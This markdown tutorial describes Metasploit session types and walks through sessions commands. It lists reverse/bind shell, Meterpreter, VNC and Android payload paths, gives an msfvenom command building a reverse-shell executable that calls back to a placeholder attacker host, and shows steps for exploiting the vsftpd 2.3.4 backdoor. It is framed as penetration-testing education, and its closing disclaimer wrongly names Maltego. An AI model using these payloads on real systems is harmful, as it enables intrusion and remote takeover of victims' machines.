# **METASPLOIT FRAMEWORK & ITS SESSIONS**

 Metasploit, developed by Rapid7, is one of the most used tools in the penetration testing lane. It is designed to help security professionals identify, exploit, and validate vulnerabilities in systems. It provides a very powerful channel for ethical hacking, enabling users to simulate attacks in a controlled environment to improve system defenses.
 Metasploit is both a tool and a framework, allowing users to exploit vulnerabilities in systems, write custom exploits, and automate security testing tasks.

### **KEY FEATURES & FUNCTIONS OF METASPLOIT FRAMEWORK**

 * **Exploitation** >> Metasploit runs a wide library of pre-built exploits, payloads, & auxiliary modules that attackers use to their advantage to penetrate their targets system, applications & services.

 * **Payloads** >> These are code fragments delivered to the target after exploiting a vulnerability. Payload varies (Meterpreter, Reverse shell, Bind shell, Stagers).

 * **Post-Exploitation** >> These are the activities that occur after an attacker might have gained access to its target system, at this stage, the attacker can escalate privileges, harvest credentials, pivot or collect system information.

 * **Nmap Integration** >> Nmap scans can be imported into Metasploit to identify exploitable vulnerabilities based on discovered services.

 * **Exploit Development** >> Metasploit allows advanced users to write custom exploits tailored for specific vulnerabilities, enabling targeted testing.
 * **Evading Detection** >> Metasploit provides features to encode payloads, bypass antivirus detection, and avoid IDS/IPS systems.

 * **Armitage GUI** >> A graphical front-end for Metasploit that simplifies using the framework, making it accessible to beginners.
  
### **METASPLOIT FRAMEWORK SESSIONS & ITS USES**

 **(I). SHELL SESSIONS** >> A basic *Shell* session gives an attacker only command line access to the target system. such as;
  
  * *Reverse Shell* - Target machine connects back to the attackers machine >> `payload/windows/shell/reverse_tcp` / `payload/linux/x86/shell/reverse_tcp`

  * *Bind Shell* - Target machine listens on a specific port for a connection from the hacker >> `payload/windows/shell/bind_tcp`

   **Shell Sessions lack the advanced capabilities of Meterpreter (e.g., file upload/download, process migration).**

 **(II). COMMAND SHELL SESSIONS** >> A more interactive shell session that allows execution of system commands with added stability. It is quite similar to *Shell Sessions*, but slightly more robust.
 
 **Example** >> `payload/generic/shell_reverse_tcp`
  
 **(III). VNC SESSIONS** >> It provides a graphical user interface access to target systems via *Virtual Network Computing*.
 
 *VNC Reverse* >> `payload/windows/vncinject/reverse_tcp`

 *VNC Bind* >> `payload/windows/vncinject/bind_tcp`

  **It has full GUI access, more useful for performing actions that require visual interaction, but it is easy to detect.**

 **(IV). HTTP/HTTPS SHELL** >> Payloads like these are used to bypass firewalls or proxy settings, as HTTP/HTTPS traffic is less likely to be blocked.

 *HTTP Reverse Shell* >> `payload/windows/meterpreter/reverse_http`

 *HTTPS Reverse Shell* >> `payload/windows/meterpreter/reverse_https`

 **(V). JAVA SHELLS** >> Java-based sessions that exploit Java vulnerabilities to execute commands or payloads on the target.
 
 *Example* >> `payload/java/meterpreter/reverse_tcp`

**(VI). POWERSHELL SESSIONS** >> Used for Windows systems to execute *PowerShell* commands on the target.

 *Example* >> `payload/windows/powershell_reverse_tcp`

**(VII). ANDROID  METERPRETER SESSION** >> Designed for Android devices, enabling control of the target device, if access is gained, it can access files, cameras, SMS messages, and location.

 *Example* >> `payload/android/meterpreter/reverse_tcp`

**(VIII). PHP WEB SHELLS** >> Web-based shells that exploit vulnerable web applications, it penetrates through the web server.

 *Example* >> `payload/php/shell/reverse_tcp`

**(IX). CUSTOM SESSION** >> Custom payloads can be created using Metasploit's `msfvenom` tool, and it can be tailored for specific environments, such as IoT devices or embedded systems.

 *Command to create a custom payload* >> `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell.exe`


### **SESSIONS MANAGEMENT COMMANDS**

 * List active sessions >> `sessions -l`
  
 * Interact with a specific session >> `sessions -i <session-id>`

 * Kill a session >> `sessions -k <session-id>`
  

### **CHOOSING THE RIGHT SESSION**

 * Use Meterpreter for advanced post-exploitation.

 * Opt for shell sessions when minimal intrusion is needed.
 
 * Use HTTP/HTTPS payloads for stealthy attacks.

 * Consider VNC sessions for GUI-based actions


### **HOW TO GENERATE MULTIPLE SESSIONS**

 * open *metasploit* in terminal >> `sudo msfconsole`
 
 * search for any payload you intend to use, (vsftpd) in this context >> `search vsftpd`

 * Few options will display, select which suites you best >> `use exploit/unix/ftp/vsftpd_234_backdoor`
  
 * Set necessary parameters, input `show options` >> `set RHOSTS "target IP"` >> `set payload cmd/unix/interact` >> `exploit`

 **As seen below, we already have 1 *SHELL SESSION* opened;**


 <img src="Screenshot from 2025-01-27 07-07-36.png" alt="alt text" width="750"><br><br><br>

 **Now, let's upgrade it to 2 sessions, *1 SHELL & 1 METERPRETER;***

 * see list of active session >> `sessions -l`
  
 * upgrade from *Shell to Meterpreter* >> `sessions -u 1`

 * open *Meterpreter* session >> `sessions -i 2`

 <img src="Screenshot from 2025-01-27 07-28-04.png" alt="alt text" width="750"><br><br><br>
 

**NOTE; There are various other ways & means of getting a *Meterpreter* session, it all depends on the goal of your testing, but once a *Meterpreter* session is generated, it has full access to the targets system, and can perform powerful & damaging functions.**
 
 *Meterpreter is a dynamic, post-exploitation tool integrated into the Metasploit Framework. It provides an interactive command shell on the exploited target, enabling advanced post-exploitation tasks such as file system navigation, privilege escalation, and network reconnaissance.*

 ***Ethical Use Case*** >> *Meterpreter sessions are a core component of authorized penetration testing and red teaming exercises. They are used to identify and remediate vulnerabilities within systems, ensuring compliance with security standards and protecting sensitive assets.*




## THIS DOCUMENTATION IS INTENDED SOLELY FOR EDUCATIONAL PURPOSES. THE AUTHOR ASSUMES NO RESPONSIBILITY OR LIABILITY FOR ANY MISUSE, MISCONDUCT, OR UNLAWFUL ACTIVITIES CARRIED OUT USING THIS GUIDE. USERS ARE SOLELY RESPONSIBLE FOR ENSURING COMPLIANCE WITH APPLICABLE LAWS, REGULATIONS, AND ETHICAL STANDARDS WHEN USING MALTEGO OR ANY RELATED TOOLS OR TECHNIQUES.